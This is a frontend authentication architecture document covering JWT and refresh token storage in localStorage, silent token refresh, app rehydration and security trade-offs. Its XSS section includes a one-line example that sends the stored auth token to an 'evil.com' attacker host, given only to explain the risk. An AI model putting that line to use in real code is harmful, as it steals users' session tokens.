# Auth Architecture — JWT in localStorage with Refresh Tokens

## How Auth Works

```
1. Login → server returns { token: "eyJhb...", refreshToken: "opaque..." }
2. Frontend stores both: localStorage("auth_token"), localStorage("refresh_token")
3. Every request: Authorization: Bearer eyJhb...
4. Token expired → POST /auth/refresh → rotate both tokens, retry original request
5. Logout: clear both tokens from localStorage, redirect to /login
```

---

## Token Lifetimes

| Token | Storage | Lifetime | Notes |
|---|---|---|---|
| Access token (JWT) | `localStorage` → `auth_token` | 60 min (configurable) | Attached as `Authorization: Bearer` |
| Refresh token (opaque) | `localStorage` → `refresh_token` | 7 days | Single-use — rotates on every refresh |

---

## Silent Token Refresh Flow

The axios response interceptor in `apiClient.ts` handles expiry transparently:

```
Any request → 401
  ├─ Is an /auth/* endpoint? → reject immediately (no retry loop)
  ├─ No refresh token stored? → clear tokens, redirect to /login
  ├─ Refresh already in flight? → queue this request, wait for new token
  └─ Otherwise:
       POST /auth/refresh { refreshToken }
         ├─ 200 → store new token + refreshToken, drain queue, retry original request ✓
         └─ 401 → clear tokens, redirect to /login
```

Concurrent requests that 401 while a refresh is in flight are queued and replayed once the new token arrives — only one refresh call is ever made.

---

## App Load — Rehydration

```
App mounts
  → useCurrentUser fires (React Query)
  → GET /auth/me  (Authorization: Bearer <stored access token>)
  → 200: user state restored ✓
  → 401 (access token expired): interceptor calls POST /auth/refresh
       → 200: tokens rotated, /auth/me retried ✓
       → 401: redirect to /login
```

`/auth/me` is a no-database JWT claims read — fast and cheap. It is the happy-path rehydration call. The refresh flow is the silent fallback.

---

## Token Storage (`src/utils/tokenStorage.ts`)

```ts
tokenStorage.get()                         // read access token
tokenStorage.getRefreshToken()             // read refresh token
tokenStorage.setTokens(token, refresh)    // store both after login/register/refresh
tokenStorage.clear()                       // remove both on logout
```

---

## Security Trade-offs

### XSS

Storing JWTs in `localStorage` means JavaScript can read them. An XSS attack can extract the token:

```js
fetch("https://evil.com/steal?t=" + localStorage.getItem("auth_token"))
```

Mitigations in place:
- React's JSX escaping prevents most reflected/stored XSS
- Content Security Policy (CSP) headers on the server reduce injection surface
- Short access token lifetime (60 min) limits the damage window
- Refresh token rotation means a stolen refresh token can only be used once before it's invalidated

### CSRF

Not a concern for Bearer token auth — cookies are not used, so there is nothing for a cross-site request to attach automatically.

---

## What Is NOT Used

- **HttpOnly cookies** — the original design used `__Host-Nexus-Auth` cookies with `withCredentials: true`. The backend was updated to JWT bearer tokens.
- **Zustand `authStore`** — the original design used a Zustand store with `initialize()` / `login()` / `logout()` actions. The current implementation uses React Query (`useCurrentUser`) and plain hooks (`useLogout`).
- **`withCredentials: true`** — not needed; Bearer tokens are attached explicitly by the request interceptor.

---

## Mental Model

> **JWT localStorage auth:** "I carry my ID card and show it at every door. When it expires, reception issues a new one automatically and I keep walking."

---

## See Also

- [`docs/backend-auth.md`](./backend-auth.md) — API endpoints, request/response shapes, error codes
- [`docs/frontend-auth-summary.md`](./frontend-auth-summary.md) — frontend file map, hooks, and flow
